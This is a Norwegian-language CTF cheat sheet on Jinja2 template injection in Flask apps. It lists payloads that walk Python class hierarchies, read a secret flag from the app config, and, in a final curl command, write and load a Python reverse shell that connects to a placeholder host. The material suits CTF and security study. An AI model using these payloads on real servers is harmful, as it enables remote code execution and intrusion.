# Template injection

## Flask (Python og Jinja) - Template injection
Funksjonen `render_template_string` er sårbar og er som 
regel sårbarheten i Flask-oppgaver. 
Brukerkontrollert input til `render_template_string`, 
gjør det mulig å kjøre kode. Det gjør vi ved å legge 
inn egne templates. Eksempel på template:
```
{{1+2}}
```

Flask bruker [Jinja](https://l.messenger.com/l.php?u=http%3A%2F%2Fjinja.pocoo.org%2Fdocs%2F2.10%2F&h=AT3awb25ic-bDs9YFjYR4v7rt_QZgIWmEHtbLJ0UF-Jo6rtItGzxBfv5n_GevTe7LAlMz-CL4PvOoRkdBqP8yyJ5t5KJJWFUEl_LYbpuk-oM_QogzOS8Wn1QfcNMbR6nkao)
som er et templating språk. Flask har et objekt som heter `request` 
som i noen tilfeller brukes for å finne info. Med request kan man 
prøve å komme seg til et objekt som har oversikten over de filene 
vi ønsker. 

En fremgangsmåte er å kjøre opp kildekoden hos seg selv om den er 
tilgjengelig. Da kan man teste og lete litt rundt selv og se hvilke
funksjoner som er tilgjengelig via din template. Noen 
ganger kan man bruke en bug for å hente ut kildekoden først,
f.eks. med LFI. Deretter kan man f.eks teste ut de tingene som er 
blacklistet, for å finne ut hva som skjuler seg. Det kan være 
funksjoner som kan brukes som ellers er vanskelig å finne ut at er der. 

#### Examples
* For å komme til vilkårlige klasser 
`{{request.__class__.__mro__[8].__subclasses__()[40]....}}`, 
hvor man så må finne riktig klasse. 
* Tilsvarende kan man bruke denne for å få tak i klasser 
`{{[].__class__.__base__.__subclasses__()...}}`
* Eksempel med at `url_for` er en Flask funksjon 
som er tilgjengelig fra templaten din.  
`{{url_for.__globals__['current_app'].config['FLAG']}}`. 
Fra dette eksempelet er flagget dyttet inn i config som er
en dictionary i starten av filen, `app.config['FLAG'] = os.environ.pop('FLAG')`.
* Finne/komme seg til Flask-objektet fordi det gir full oversikt. 
(Ikke gjort før, kommer sikkert)
* Reverse shell: 
```
curl 'localhost:8088/?next={{request.__class__.__mro__[8].__subclasses__()[40](request.headers[request.headers.keys()[6]],request.headers[request.headers.keys()[6]][5]).write(request.headers[request.headers.keys()[4]])}}{{config.from_pyfile(request.headers[request.headers.keys()[6]])}}' -g -H "x-f: /tmp/w" -H 'x-p: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("REVERSE_SHELL_IP",REVERSE_SHELL_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Sources
* https://0day.work/ictf-2017-flasking-unicorns-writeup-or-how-we-might-have-rooted-your-ictf-vm/#flaskingunicorns
* https://0day.work/jinja2-template-injection-filter-bypasses/
